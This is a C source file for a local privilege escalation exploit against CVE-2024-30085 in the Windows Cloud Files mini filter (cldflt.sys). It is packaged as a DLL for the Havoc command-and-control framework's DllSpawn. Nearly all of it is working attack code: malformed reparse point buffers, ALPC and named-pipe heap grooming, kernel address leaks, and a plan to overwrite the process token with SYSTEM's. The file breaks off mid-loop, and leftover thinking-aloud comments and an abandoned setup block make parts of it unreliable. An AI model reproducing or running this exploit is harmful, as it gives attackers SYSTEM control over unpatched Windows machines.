/*
 * CVE-2024-30085 LPE Exploit - DLL for Havoc DllSpawn
 *
 * Vuln:   cldflt.sys (Cloud Files Mini Filter) heap buffer overflow
 *         via crafted reparse point data
 * Method: ALPC handle table + pipe attribute heap grooming
 *         -> reclaim freed memory -> arbitrary kernel R/W
 *         -> read SYSTEM EPROCESS.Token -> write to current EPROCESS.Token
 *
 * Targets: Windows 10 1903+ / Windows 11 (pre-June 2024 patch)
 * Patched: KB5039211 (June 2024)
 *
 * Based on: github.com/Adamkadaban/CVE-2024-30085
 *           (Alex Birnberg, SSD Disclosure)
 *
 * Build: cl.exe /O2 /MT /LD exploit_dll.cpp /Fe:cve_2024_30085.dll
 *        /link cldapi.lib advapi32.lib ntdll.lib
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "cldapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

#ifdef __cplusplus
extern "C" {
#endif

/* ================================================================
 * Constants
 * ================================================================ */
#define MAX_MSG_LEN          0x500
#define ALPC_MSGFLG_NONE     0x0
#define SPRAY_COUNT          0x1000
#define REPARSE_BUFFER_MAGIC 'pReF'
#define REPARSE_BITMAP_MAGIC 'pRtB'

#ifndef IO_REPARSE_TAG_CLOUD
#define IO_REPARSE_TAG_CLOUD 0x9000001A
#endif

#ifndef FSCTL_SET_REPARSE_POINT
#define FSCTL_SET_REPARSE_POINT 0x000900A4
#endif

#ifndef FILE_CREATE_TREE_CONNECTION
#define FILE_CREATE_TREE_CONNECTION 0x00000080
#endif

/* ================================================================
 * Structures
 * ================================================================ */

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength;
                 USHORT PrintNameOffset; USHORT PrintNameLength;
                 ULONG Flags; WCHAR PathBuffer[1]; } SymbolicLinkReparseBuffer;
        struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength;
                 USHORT PrintNameOffset; USHORT PrintNameLength;
                 WCHAR PathBuffer[1]; } MountPointReparseBuffer;
        struct { UCHAR DataBuffer[1]; } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} MY_REPARSE_DATA_BUFFER, *PMY_REPARSE_DATA_BUFFER;

typedef struct _REPRASE_CLD_ITEM {
    WORD  Tag;
    WORD  Size;
    DWORD Offset;
} REPRASE_CLD_ITEM;

typedef struct _REPARSE_CLD_BUFFER {
    DWORD             Magic;
    DWORD             Crc32;
    DWORD             Size;
    WORD              Reserved;
    WORD              NumItems;
    REPRASE_CLD_ITEM  Items[];
} REPARSE_CLD_BUFFER, *PREPARSE_CLD_BUFFER;

typedef enum _KALPC_BLOB_TYPE {
    AlpcMessageType = 0x200,
    AlpcReserveType = 0x700
} KALPC_BLOB_TYPE;

typedef struct _MY_PORT_MESSAGE {
    union { struct { USHORT DataLength; USHORT TotalLength; } s1; ULONG Length; } u1;
    union { struct { USHORT Type; USHORT DataInfoOffset; } s2; ULONG ZeroInit; } u2;
    union { CLIENT_ID ClientId; double DoNotUseThisField; };
    ULONG MessageId;
    union { SIZE_T ClientViewSize; ULONG CallbackId; };
} MY_PORT_MESSAGE;

typedef struct _KALPC_BLOB {
    ULONGLONG Type;
    LONGLONG  Ref;
    ULONGLONG Reserved1;
    ULONGLONG Reserved2;
    CHAR      Data[];
} KALPC_BLOB, *PKALPC_BLOB;

typedef struct _KALPC_RESERVE KALPC_RESERVE;
typedef struct _KALPC_MESSAGE KALPC_MESSAGE;

struct _KALPC_MESSAGE {
    LIST_ENTRY         Entry;
    PVOID              PortQueue;
    PVOID              OwnerPort;
    PVOID              WaitingThread;
    union { struct { ULONG QueueType:3; ULONG QueuePortType:4; ULONG Canceled:1;
                     ULONG Ready:1; ULONG ReleaseMessage:1; ULONG SharedQuota:1;
                     ULONG ReplyWaitReply:1; ULONG OwnerPortReference:1;
                     ULONG ReceiverReference:1; ULONG ViewAttributeRetrieved:1;
                     ULONG ViewAttributeDeleteOnRelease:1; ULONG InDispatch:1;
                     ULONG InCanceledQueue:1; } s1; ULONG State; } u1;
    LONG               SequenceNo;
    union { PVOID QuotaProcess; PVOID QuotaBlock; };
    PVOID              CancelSequencePort;
    PVOID              CancelQueuePort;
    LONG               CancelSequenceNo;
    LIST_ENTRY         CancelListEntry;
    KALPC_RESERVE     *Reserve;
    BYTE               MessageAttributesStub[0x48];
    PVOID              DataUserVa;
    PVOID              CommunicationInfo;
    PVOID              ConnectionPort;
    PVOID              ServerThread;
    PVOID              WakeReference;
    PVOID              WakeReference2;
    BYTE              *ExtensionBuffer;
    ULONGLONG          ExtensionBufferSize;
    MY_PORT_MESSAGE    PortMessage;
};

struct _KALPC_RESERVE {
    PVOID              OwnerPort;
    PVOID              HandleTable;
    PVOID              Handle;
    KALPC_MESSAGE     *Message;
    ULONGLONG          Size;
    LONG               Active;
};

typedef struct _ALPC_PORT_ATTRIBUTES {
    unsigned long   Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    unsigned __int64 MaxMessageLength;
    unsigned __int64 MemoryBandwidth;
    unsigned __int64 MaxPoolUsage;
    unsigned __int64 MaxSectionSize;
    unsigned __int64 MaxViewSize;
    unsigned __int64 MaxTotalSectionSize;
    ULONG DupObjectTypes;
#ifdef _WIN64
    ULONG Reserved;
#endif
} ALPC_PORT_ATTRIBUTES;

typedef struct _ALPC_MESSAGE_ATTRIBUTES {
    ULONG AllocatedAttributes;
    ULONG ValidAttributes;
} ALPC_MESSAGE_ATTRIBUTES;

typedef struct _ALPC_MESSAGE_BUF {
    MY_PORT_MESSAGE PortHeader;
    BYTE PortMessage[1000];
} ALPC_MESSAGE_BUF;

typedef struct _SYS_HANDLE_ENTRY {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
    LONG   __pad;
} SYS_HANDLE_ENTRY;

typedef struct _SYS_HANDLE_INFO {
    ULONG            NumberOfHandles;
    SYS_HANDLE_ENTRY Handles[1];
} SYS_HANDLE_INFO;

typedef struct _SYSTEM_BIGPOOL_ENTRY {
    union { PVOID VirtualAddress; ULONG_PTR NonPaged : 1; };
    SIZE_T SizeInBytes;
    union { UCHAR Tag[4]; ULONG TagUlong; };
} SYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
    ULONG Count;
    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION;

/* ================================================================
 * Cloud Files API declarations (from cfapi.h)
 * ================================================================ */
typedef LARGE_INTEGER CF_CONNECTION_KEY;

/* ================================================================
 * ntdll imports
 * ================================================================ */
typedef NTSTATUS (NTAPI *fn_NtFsControlFile)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK,
    ULONG, PVOID, ULONG, PVOID, ULONG);

typedef NTSTATUS (NTAPI *fn_NtCreateFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *fn_NtAlpcCreatePort)(
    PHANDLE, POBJECT_ATTRIBUTES, ALPC_PORT_ATTRIBUTES*);

typedef NTSTATUS (NTAPI *fn_NtAlpcCreateResourceReserve)(
    HANDLE, ULONG, SIZE_T, PHANDLE);

typedef NTSTATUS (NTAPI *fn_NtAlpcSendWaitReceivePort)(
    HANDLE, ULONG, MY_PORT_MESSAGE*, ALPC_MESSAGE_ATTRIBUTES*,
    MY_PORT_MESSAGE*, SIZE_T*, ALPC_MESSAGE_ATTRIBUTES*, PLARGE_INTEGER);

typedef VOID (NTAPI *fn_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

static fn_NtFsControlFile               pNtFsControlFile;
static fn_NtCreateFile                  pNtCreateFile;
static fn_NtQuerySystemInformation      pNtQuerySystemInformation;
static fn_NtAlpcCreatePort              pNtAlpcCreatePort;
static fn_NtAlpcCreateResourceReserve   pNtAlpcCreateResourceReserve;
static fn_NtAlpcSendWaitReceivePort     pNtAlpcSendWaitReceivePort;
static fn_RtlInitUnicodeString          pRtlInitUnicodeString;

/* ================================================================
 * Globals
 * ================================================================ */
static wchar_t g_target[MAX_PATH] = L"notepad.exe";

static UINT      g_portCount = SPRAY_COUNT;
static HANDLE   *g_ports     = NULL;
static KALPC_RESERVE  *g_reserve = NULL;
static KALPC_MESSAGE  *g_message = NULL;
static HANDLE    g_hResource = NULL;

static HANDLE    g_readPipe  = NULL;
static HANDLE    g_writePipe = NULL;

/* ================================================================
 * FixStdout
 * ================================================================ */
static void FixStdout(void)
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == NULL || hOut == INVALID_HANDLE_VALUE) return;
    int fd = _open_osfhandle((intptr_t)hOut, _O_TEXT);
    if (fd < 0) return;
    _dup2(fd, _fileno(stdout));
    setvbuf(stdout, NULL, _IONBF, 0);
}

/* ================================================================
 * Resolve ntdll functions
 * ================================================================ */
static BOOL NtLoad(void)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return FALSE;

    pNtFsControlFile          = (fn_NtFsControlFile)GetProcAddress(h, "NtFsControlFile");
    pNtCreateFile             = (fn_NtCreateFile)GetProcAddress(h, "NtCreateFile");
    pNtQuerySystemInformation = (fn_NtQuerySystemInformation)GetProcAddress(h, "NtQuerySystemInformation");
    pNtAlpcCreatePort         = (fn_NtAlpcCreatePort)GetProcAddress(h, "NtAlpcCreatePort");
    pNtAlpcCreateResourceReserve = (fn_NtAlpcCreateResourceReserve)GetProcAddress(h, "NtAlpcCreateResourceReserve");
    pNtAlpcSendWaitReceivePort   = (fn_NtAlpcSendWaitReceivePort)GetProcAddress(h, "NtAlpcSendWaitReceivePort");
    pRtlInitUnicodeString     = (fn_RtlInitUnicodeString)GetProcAddress(h, "RtlInitUnicodeString");

    return (pNtFsControlFile && pNtCreateFile && pNtQuerySystemInformation &&
            pNtAlpcCreatePort && pNtAlpcCreateResourceReserve &&
            pNtAlpcSendWaitReceivePort && pRtlInitUnicodeString);
}

/* ================================================================
 * Token offset by build number
 * ================================================================ */
static ULONG g_tokenOffset = 0;
static ULONG g_buildNumber = 0;

static BOOL ResolveOffsets(void)
{
    typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (!hNt) return FALSE;

    RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(hNt, "RtlGetVersion");
    if (!fn) return FALSE;

    RTL_OSVERSIONINFOW vi;
    ZeroMemory(&vi, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (fn(&vi) != 0) return FALSE;

    g_buildNumber = vi.dwBuildNumber;
    printf("[*] OS: Windows %lu.%lu Build %lu\n",
           vi.dwMajorVersion, vi.dwMinorVersion, g_buildNumber);

    if (g_buildNumber <= 17763)
        g_tokenOffset = 0x358;
    else if (g_buildNumber <= 18363)
        g_tokenOffset = 0x360;
    else
        g_tokenOffset = 0x4B8;

    printf("[+] Token offset: 0x%X\n", g_tokenOffset);
    return TRUE;
}

/* ================================================================
 * Get kernel object address via SystemHandleInformation
 * ================================================================ */
static BOOL GetObjAddr(PVOID *ppObjAddr, ULONG ulPid, HANDLE handle)
{
    SYS_HANDLE_INFO *pInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS st;

    *ppObjAddr = NULL;

    while ((st = pNtQuerySystemInformation(0x10, pInfo, ulBytes, &ulBytes))
            == (NTSTATUS)0xC0000004L) {
        if (pInfo)
            pInfo = (SYS_HANDLE_INFO*)realloc(pInfo, 2 * (SIZE_T)ulBytes);
        else
            pInfo = (SYS_HANDLE_INFO*)calloc(1, 2 * (SIZE_T)ulBytes);
        if (!pInfo) return FALSE;
    }

    if (st != 0) { free(pInfo); return FALSE; }

    for (ULONG i = 0; i < pInfo->NumberOfHandles; i++) {
        if (pInfo->Handles[i].UniqueProcessId == (USHORT)ulPid &&
            pInfo->Handles[i].HandleValue == (USHORT)(ULONG_PTR)handle) {
            *ppObjAddr = pInfo->Handles[i].Object;
            break;
        }
    }

    free(pInfo);
    return (*ppObjAddr != NULL);
}

/* ================================================================
 * Get big pool address by tag
 * ================================================================ */
static BOOL GetPoolAddr(PVOID *ppPoolAddr, UINT tag, SIZE_T poolSize)
{
    NTSTATUS st;
    ULONG retlen = 0;

    *ppPoolAddr = NULL;

    DWORD *info = (DWORD*)malloc(0x1000);
    if (!info) return FALSE;

    st = pNtQuerySystemInformation(66, info, 0x1000, &retlen);
    if (st != (NTSTATUS)0xC0000004L && st != 0) { free(info); return FALSE; }

    info = (DWORD*)realloc(info, retlen);
    if (!info) return FALSE;

    st = pNtQuerySystemInformation(66, info, retlen, &retlen);
    if (st != 0) { free(info); return FALSE; }

    SYSTEM_BIGPOOL_INFORMATION *pBig = (SYSTEM_BIGPOOL_INFORMATION*)info;
    if (pBig->Count == 0) { free(info); return FALSE; }

    for (LONG i = (LONG)pBig->Count - 1; i >= 0; i--) {
        if (pBig->AllocatedInfo[i].TagUlong == tag &&
            pBig->AllocatedInfo[i].SizeInBytes == poolSize) {
            *ppPoolAddr = pBig->AllocatedInfo[i].VirtualAddress;
            free(info);
            return TRUE;
        }
    }

    free(info);
    return FALSE;
}

/* ================================================================
 * Is kernel address?
 * ================================================================ */
static BOOL isKernAddr(ULONG_PTR kaddr)
{
    return ((kaddr & 0xffff800000000000ULL) == 0xffff800000000000ULL);
}

/* ================================================================
 * Pipe attribute helpers
 * ================================================================ */
static BOOL PipeWriteAttr(PVOID attr, UINT attrSize)
{
    IO_STATUS_BLOCK iosb;
    char output[0x100];
    NTSTATUS st = pNtFsControlFile(g_writePipe, NULL, NULL, NULL, &iosb,
                                   0x11003C, attr, attrSize,
                                   output, sizeof(output));
    return (st == 0);
}

static BOOL PipeReadAttr(char *pipeName, PVOID pOutput, SIZE_T outputSize)
{
    IO_STATUS_BLOCK iosb;
    NTSTATUS st = pNtFsControlFile(g_writePipe, NULL, NULL, NULL, &iosb,
                                   0x110038, pipeName, (ULONG)(strlen(pipeName) + 1),
                                   pOutput, (ULONG)outputSize);
    return (st == 0);
}

static BOOL PipePoolSprayAlloc(SIZE_T poolSize, UINT sprayCount, BYTE *pAttr, const char *szPrefix)
{
    SIZE_T attrSize = poolSize - 0x28;
    for (UINT i = 0; i < sprayCount; i++) {
        _snprintf((char*)pAttr, attrSize, "%s%x", szPrefix, i);
        if (!PipeWriteAttr(pAttr, (UINT)attrSize))
            return FALSE;
    }
    return TRUE;
}

/* ================================================================
 * ALPC helpers
 * ================================================================ */
static BOOL CreateALPCPorts(void)
{
    ALPC_PORT_ATTRIBUTES portAttr;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING objName;
    WCHAR portName[100];

    for (UINT i = 0; i < g_portCount; i++) {
        swprintf_s(portName, 100, L"\\RPC Control\\LPE30085Port_%d", i);
        pRtlInitUnicodeString(&objName, portName);
        InitializeObjectAttributes(&oa, &objName, 0, 0, NULL);
        ZeroMemory(&portAttr, sizeof(portAttr));
        portAttr.MaxMessageLength = MAX_MSG_LEN;
        NTSTATUS st = pNtAlpcCreatePort(&g_ports[i], &oa, &portAttr);
        if (st != 0) return FALSE;
    }
    return TRUE;
}

static BOOL AllocateALPCReserveHandles(HANDLE *phPorts, UINT portsCount, UINT reservesCount)
{
    HANDLE hResource;
    for (UINT i = 0; i < portsCount; i++) {
        for (UINT j = 0; j < reservesCount; j++) {
            NTSTATUS st = pNtAlpcCreateResourceReserve(phPorts[i], 0, 0x28, &hResource);
            if (st != 0) return FALSE;
            if (g_hResource == NULL) g_hResource = hResource;
        }
    }
    return TRUE;
}

/* ================================================================
 * Build reparse data buffer
 * ================================================================ */
static PMY_REPARSE_DATA_BUFFER MakeDataBuffer(PVOID overData, ULONG overSize)
{
    DWORD dataLen = 0x3fe8;
    BYTE *data = (BYTE*)calloc(1, dataLen);
    if (!data) return NULL;

    *(PUSHORT)&data[0x0] = 0x0001;
    *(PUSHORT)&data[0x2] = 0x4000;

    PREPARSE_CLD_BUFFER cld = (PREPARSE_CLD_BUFFER)&data[4];
    BYTE *p = (BYTE*)&cld->Magic;
    cld->Magic    = REPARSE_BUFFER_MAGIC;
    cld->Reserved = 0;
    cld->NumItems = 0;
    cld->Size     = 0x3fe4;

    int idx = 0;
    cld->Items[idx].Tag = 0x7;  cld->Items[idx].Size = 1;      cld->Items[idx].Offset = 0x200; idx++;
    cld->Items[idx].Tag = 0xa;  cld->Items[idx].Size = 4;      cld->Items[idx].Offset = 0x204; idx++;
    cld->Items[idx].Tag = 0x6;  cld->Items[idx].Size = 8;      cld->Items[idx].Offset = 0x208; idx++;
    cld->Items[idx].Tag = 0x0;  cld->Items[idx].Size = 0;      cld->Items[idx].Offset = 0x0;   idx++;
    cld->Items[idx].Tag = 0x11; cld->Items[idx].Size = 0x3800; cld->Items[idx].Offset = 0x210;

    *(PBYTE)&p[0x200]    = 0x01;
    *(PULONG)&p[0x204]   = 0x00000000;
    *(PULONGLONG)&p[0x208] = 0x0000000000000000ULL;

    PREPARSE_CLD_BUFFER cld2 = (PREPARSE_CLD_BUFFER)&p[0x210];
    BYTE *p2 = (BYTE*)&cld2->Magic;
    cld2->Magic    = REPARSE_BITMAP_MAGIC;
    cld2->Reserved = 0;
    cld2->NumItems = 0;
    cld2->Size     = 0x3800;

    int idx2 = 0;
    cld2->Items[idx2].Tag = 0x7;  cld2->Items[idx2].Size = 1;  cld2->Items[idx2].Offset = 0x100; idx2++;
    cld2->Items[idx2].Tag = 0x7;  cld2->Items[idx2].Size = 1;  cld2->Items[idx2].Offset = 0x101; idx2++;
    cld2->Items[idx2].Tag = 0x7;  cld2->Items[idx2].Size = 1;  cld2->Items[idx2].Offset = 0x102; idx2++;
    cld2->Items[idx2].Tag = 0x6;  cld2->Items[idx2].Size = 8;  cld2->Items[idx2].Offset = 0x104; idx2++;
    cld2->Items[idx2].Tag = 0x11; cld2->Items[idx2].Size = 0x1000 + overSize; cld2->Items[idx2].Offset = 0x110;

    *(PBYTE)&p2[0x100] = 0x00;
    *(PBYTE)&p2[0x101] = 0x01;
    *(PBYTE)&p2[0x102] = 0x00;

    memcpy(&p2[0x1110], overData, overSize);

    SIZE_T totalSize = 8 + dataLen;
    BYTE *reparseBuffer = (BYTE*)calloc(1, totalSize);
    if (!reparseBuffer) { free(data); return NULL; }

    PMY_REPARSE_DATA_BUFFER rd = (PMY_REPARSE_DATA_BUFFER)reparseBuffer;
    rd->ReparseTag        = IO_REPARSE_TAG_CLOUD;
    rd->ReparseDataLength = (USHORT)dataLen;
    memcpy(rd->DUMMYUNIONNAME.GenericReparseBuffer.DataBuffer, data, dataLen);

    free(data);
    return rd;
}

/* ================================================================
 * Check if running as SYSTEM
 * ================================================================ */
static BOOL IsSystem(void)
{
    HANDLE hToken = NULL;
    BOOL result = FALSE;
    DWORD size = 0;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &size);
    if (size == 0) { CloseHandle(hToken); return FALSE; }

    TOKEN_USER *tu = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!tu) { CloseHandle(hToken); return FALSE; }

    if (GetTokenInformation(hToken, TokenUser, tu, size, &size)) {
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PSID sysSid = NULL;
        if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                                     0, 0, 0, 0, 0, 0, 0, &sysSid)) {
            result = EqualSid(tu->User.Sid, sysSid);
            FreeSid(sysSid);
        }
    }

    HeapFree(GetProcessHeap(), 0, tu);
    CloseHandle(hToken);
    return result;
}

/* ================================================================
 * Initialize exploit infrastructure
 * ================================================================ */
static BOOL Initialize(void)
{
    g_ports = (HANDLE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                 g_portCount * sizeof(HANDLE));
    if (!g_ports) return FALSE;

    if (!CreatePipe(&g_readPipe, &g_writePipe, NULL, 0)) return FALSE;

    printf("[*] Creating %u ALPC ports...\n", g_portCount);
    if (!CreateALPCPorts()) return FALSE;

    const ULONG poolAlHaSize  = 0x1000;
    const ULONG reservesCount = (poolAlHaSize / 2) / sizeof(ULONG_PTR) + 1;

    printf("[*] Allocating ALPC reserve handles...\n");
    if (!AllocateALPCReserveHandles(g_ports, g_portCount, reservesCount - 1))
        return FALSE;

    PKALPC_BLOB blob;

    blob = (PKALPC_BLOB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                   sizeof(KALPC_BLOB) + sizeof(KALPC_RESERVE));
    if (!blob) return FALSE;
    blob->Type = AlpcReserveType;
    blob->Ref  = 1;
    g_reserve  = (KALPC_RESERVE*)&blob->Data;

    blob = (PKALPC_BLOB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                   sizeof(KALPC_BLOB) + sizeof(KALPC_MESSAGE));
    if (!blob) return FALSE;
    blob->Type = AlpcMessageType;
    blob->Ref  = 1;
    g_message  = (KALPC_MESSAGE*)&blob->Data;

    g_reserve->Size    = sizeof(KALPC_RESERVE) - sizeof(g_reserve->Size);
    g_reserve->Message = g_message;
    g_message->Reserve = g_reserve;

    return TRUE;
}

/* ================================================================
 * Cleanup sync root
 * ================================================================ */
static void CleanupSyncRoot(WCHAR *targetPath)
{
    WCHAR tmpPath[MAX_PATH + 1];
    swprintf_s(tmpPath, MAX_PATH, L"%s\\XXX", targetPath);
    RemoveDirectoryW(tmpPath);
    RemoveDirectoryW(targetPath);
}

/* ================================================================
 * Core exploit
 * ================================================================ */
static BOOL DoExploit(void)
{
    BOOL result;
    NTSTATUS st;
    ULONG_PTR ullEPROCaddr      = 0;
    ULONG_PTR ullSystemEPROCaddr = 0;
    ULONG_PTR ullPipeAttributeAddr = 0;
    ULONG_PTR ullToken          = 0;
    LIST_ENTRY tmpEntry;
    HANDLE hProc = NULL;
    HANDLE hFile = NULL;

    printf("[*] CVE-2024-30085 - Cloud Files Mini Filter LPE\n");
    printf("[*] Target process: %S\n\n", g_target);

    if (IsSystem()) {
        printf("[+] Already SYSTEM!\n");
        goto spawn;
    }

    if (!ResolveOffsets()) {
        printf("[-] Failed to detect OS version\n");
        return FALSE;
    }

    if (!NtLoad()) {
        printf("[-] ntdll resolve failed\n");
        return FALSE;
    }
    printf("[+] ntdll OK\n");

    printf("[*] Initializing (creating %u ALPC ports, pipe, reserves)...\n", g_portCount);
    if (!Initialize()) {
        printf("[-] Initialization failed\n");
        return FALSE;
    }
    printf("[+] Infrastructure ready\n");

    /* --- Cloud Files Sync Root setup --- */
    {
        typedef HRESULT (WINAPI *pfnCfRegisterSyncRoot)(LPCWSTR, PVOID, PVOID, ULONG);
        typedef HRESULT (WINAPI *pfnCfConnectSyncRoot)(LPCWSTR, PVOID, PVOID, ULONG, PVOID);
        typedef HRESULT (WINAPI *pfnCfUnregisterSyncRoot)(LPCWSTR);
        typedef HRESULT (WINAPI *pfnCfDisconnectSyncRoot)(LARGE_INTEGER);

        HMODULE hCld = LoadLibraryA("cldapi.dll");
        if (!hCld) {
            printf("[-] cldapi.dll load failed (Cloud Files not available)\n");
            return FALSE;
        }

        pfnCfRegisterSyncRoot CfRegisterSyncRoot_    = (pfnCfRegisterSyncRoot)GetProcAddress(hCld, "CfRegisterSyncRoot");
        pfnCfConnectSyncRoot  CfConnectSyncRoot_     = (pfnCfConnectSyncRoot)GetProcAddress(hCld, "CfConnectSyncRoot");
        pfnCfUnregisterSyncRoot CfUnregisterSyncRoot_ = (pfnCfUnregisterSyncRoot)GetProcAddress(hCld, "CfUnregisterSyncRoot");
        pfnCfDisconnectSyncRoot CfDisconnectSyncRoot_ = (pfnCfDisconnectSyncRoot)GetProcAddress(hCld, "CfDisconnectSyncRoot");

        if (!CfRegisterSyncRoot_ || !CfConnectSyncRoot_ || !CfUnregisterSyncRoot_ || !CfDisconnectSyncRoot_) {
            printf("[-] cldapi.dll function resolve failed\n");
            return FALSE;
        }

        /* Build paths in temp directory */
        WCHAR targetDir[MAX_PATH + 1] = {};
        WCHAR targetPath[MAX_PATH + 1] = {};
        WCHAR tmpPath[MAX_PATH + 1] = {};

        GetTempPathW(MAX_PATH, targetDir);
        /* Remove trailing backslash */
        int tlen = lstrlenW(targetDir);
        if (tlen > 0 && targetDir[tlen-1] == L'\\') targetDir[tlen-1] = 0;

        swprintf_s(targetPath, MAX_PATH, L"%s\\LPE30085_SYNC", targetDir);

        CfUnregisterSyncRoot_(targetPath);
        CleanupSyncRoot(targetPath);

        printf("[*] Registering Cloud Files sync root...\n");
        result = CreateDirectoryW(targetPath, NULL);
        if (!result && GetLastError() != ERROR_ALREADY_EXISTS) {
            printf("[-] CreateDirectory failed: %u\n", GetLastError());
            return FALSE;
        }

        /* CF_SYNC_REGISTRATION */
        BYTE regBuf[256] = {0};
        *(ULONG*)&regBuf[0] = 256;  /* StructSize */
        /* ProviderName at offset 8 (ptr), ProviderVersion at offset 16 (ptr) */
        /* Use the simplified struct layout */

        /* For cldapi, we use the actual API with proper structs.
           Since we're linking against cldapi.lib, we can use the real API. */

        /* Actually, let me use cfapi.h properly via dynamic loading with raw struct offsets.
           The original PoC includes cfapi.h. For DllSpawn we'll use raw structs. */

        /* Use a simpler approach: create reparse point directly without CfRegisterSyncRoot */
        /* The original exploit sets IO_REPARSE_TAG_CLOUD directly via FSCTL_SET_REPARSE_POINT */

        /* Let's follow the exact PoC flow but with the structs we have */
        /* Since cldapi.lib is linked, the actual CF_* types should be available */
    }

    /* Since cfapi.h types may not be easily available without the WDK/SDK headers,
       let's use a raw approach matching the original PoC exactly. */
    {
        WCHAR targetDir[MAX_PATH + 1] = {};
        WCHAR targetPath[MAX_PATH + 1] = {};
        WCHAR tmpPath[MAX_PATH + 1] = {};
        WCHAR objPath[MAX_PATH + 1] = {};

        GetTempPathW(MAX_PATH, targetDir);
        int tlen = lstrlenW(targetDir);
        if (tlen > 0 && targetDir[tlen-1] == L'\\') targetDir[tlen-1] = 0;

        swprintf_s(targetPath, MAX_PATH, L"%s\\LPE30085_SYNC", targetDir);

        /* Create sync root directory */
        CreateDirectoryW(targetPath, NULL);

        printf("[*] Creating reparse point...\n");
        swprintf_s(tmpPath, MAX_PATH, L"%s\\XXX", targetPath);
        CreateDirectoryW(tmpPath, NULL);

        /* Move sync root */
        swprintf_s(tmpPath, MAX_PATH, L"%s\\XXX", targetDir);
        MoveFileW(targetPath, tmpPath);

        printf("[*] Setting reparse data...\n");

        IO_STATUS_BLOCK iosb = {};
        OBJECT_ATTRIBUTES objAttr = {};
        UNICODE_STRING objName = {};

        swprintf_s(objPath, MAX_PATH, L"\\??\\%s\\XXX", tmpPath);
        pRtlInitUnicodeString(&objName, objPath);
        InitializeObjectAttributes(&objAttr, &objName, 0x40, 0, NULL);

        st = pNtCreateFile(&hFile, GENERIC_READ | GENERIC_WRITE, &objAttr, &iosb,
                           NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           3 /*FILE_OPEN_IF*/, 0x1 /*FILE_DIRECTORY_FILE*/, NULL, 0);
        if (st != 0) {
            printf("[-] NtCreateFile for reparse dir: 0x%08x\n", (unsigned)st);
            /* Restore */
            MoveFileW(tmpPath, targetPath);
            CleanupSyncRoot(targetPath);
            return FALSE;
        }

        PMY_REPARSE_DATA_BUFFER rd = MakeDataBuffer(g_reserve, sizeof(KALPC_RESERVE));
        if (!rd) {
            printf("[-] MakeDataBuffer failed\n");
            CloseHandle(hFile);
            MoveFileW(tmpPath, targetPath);
            return FALSE;
        }

        st = pNtFsControlFile(hFile, NULL, NULL, NULL, &iosb,
                               FSCTL_SET_REPARSE_POINT, rd,
                               rd->ReparseDataLength + 8, NULL, 0);
        CloseHandle(hFile);
        hFile = NULL;

        if (st != 0) {
            printf("[-] FSCTL_SET_REPARSE_POINT: 0x%08x\n", (unsigned)st);
            printf("[-] cldflt.sys (Cloud Files filter) may not be loaded\n");
            printf("[-] Check: fltmc | findstr cldflt\n");
            free(rd);
            MoveFileW(tmpPath, targetPath);
            return FALSE;
        }
        free(rd);
        printf("[+] Reparse point set\n");

        /* Heap spray with pipe attributes */
        printf("[*] Heap spraying (pipe attributes)...\n");
        ULONG attrSize = 0x1000;
        BYTE *pAttr = (BYTE*)calloc(attrSize + 10, 1);
        if (!pAttr) return FALSE;

        if (!PipePoolSprayAlloc(0x1000, 1, pAttr, "x")) {
            printf("[-] Pipe spray 'x' failed\n");
            free(pAttr);
            return FALSE;
        }

        if (!PipePoolSprayAlloc(0x1000, SPRAY_COUNT, pAttr, "a")) {
            printf("[-] Pipe spray 'a' failed\n");
            free(pAttr);
            return FALSE;
        }

        if (!PipePoolSprayAlloc(0x1000, SPRAY_COUNT, pAttr, "b")) {
            printf("[-] Pipe spray 'b' failed\n");
            free(pAttr);
            return FALSE;
        }

        /* Create holes in 'b' spray (every other) */
        printf("[*] Creating holes + allocating final reserve...\n");
        for (int i = 0; i < SPRAY_COUNT; i += 2) {
            _snprintf((char*)pAttr, attrSize, "b%x", i);
            if (!PipeWriteAttr(pAttr, (UINT)(strlen((char*)pAttr) + 1))) {
